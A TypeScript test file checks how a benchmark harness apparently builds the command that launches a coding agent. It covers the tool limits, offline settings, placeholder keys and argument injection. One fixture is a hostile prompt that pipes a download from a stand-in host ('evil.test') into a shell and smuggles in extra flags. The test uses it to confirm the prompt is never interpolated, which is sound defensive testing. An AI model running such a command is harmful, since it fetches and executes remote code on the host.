import { describe, expect, it } from "vitest";
import { PLACEHOLDER_API_KEY } from "./agent-command";
import {
  IMPLEMENT_THINKING,
  PERSISTENCE_PROMPT,
  buildPiImplementCommand,
} from "./pi-implement-command";
import { PI_AGENT_DIR } from "./review-command";

describe("buildPiImplementCommand (stage 5 fallback implementer)", () => {
  const hostile = "$(curl evil.test | sh); `id` --model x\n--tools bash";
  const { command, env } = buildPiImplementCommand({
    prompt: hostile,
    model: "gpt-6.1-terra",
  });
  const arg = (flag: string) => command[command.indexOf(flag) + 1];

  it("runs pi on OpenAI with the bound model and the benchmark's thinking level", () => {
    expect(command.slice(0, 3)).toEqual(["timeout", "--kill-after=15", "900"]);
    expect(command[3]).toBe("pi");
    expect(arg("--provider")).toBe("openai");
    expect(arg("--model")).toBe("gpt-6.1-terra");
    expect(arg("--thinking")).toBe(IMPLEMENT_THINKING);
    expect(IMPLEMENT_THINKING).toBe("medium");
    expect(arg("--mode")).toBe("json");
  });

  it("gives the coding tools only, and loads nothing from the repository or the network", () => {
    expect(arg("--tools")).toBe("read,bash,edit,write");
    for (const flag of [
      "--no-session",
      "--no-extensions",
      "--no-mcp",
      "--no-skills",
      "--no-prompt-templates",
      "--no-context-files",
      "--no-approve",
    ])
      expect(command).toContain(flag);
  });

  it("appends the persistence instruction, so pi does not stop after one part", () => {
    expect(arg("--append-system-prompt")).toBe(PERSISTENCE_PROMPT);
    expect(PERSISTENCE_PROMPT).toMatch(/^# Autonomy and persistence/);
    expect(PERSISTENCE_PROMPT).toContain("End your turn only when");
  });

  it("passes the prompt as one argv element after --, never interpolated", () => {
    const dash = command.lastIndexOf("--");
    expect(command.slice(dash)).toEqual(["--", hostile]);
    expect(command.slice(0, dash).join(" ")).not.toContain("curl");
  });

  it("sets only a placeholder OpenAI key and keeps pi's settings outside the repository", () => {
    expect(env.OPENAI_API_KEY).toBe(PLACEHOLDER_API_KEY);
    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(env.PI_CODING_AGENT_DIR).toBe(PI_AGENT_DIR);
    expect(env.PI_OFFLINE).toBe("1");
    expect(PI_AGENT_DIR.startsWith("/workspace/repo")).toBe(false);
    expect(JSON.stringify(env)).not.toMatch(/sk-/);
  });

  it("rejects model names that could add flags or shell syntax", () => {
    for (const model of ["", "--x", "a b", "a;b", "$(x)"])
      expect(() => buildPiImplementCommand({ prompt: "p", model })).toThrow();
  });
});
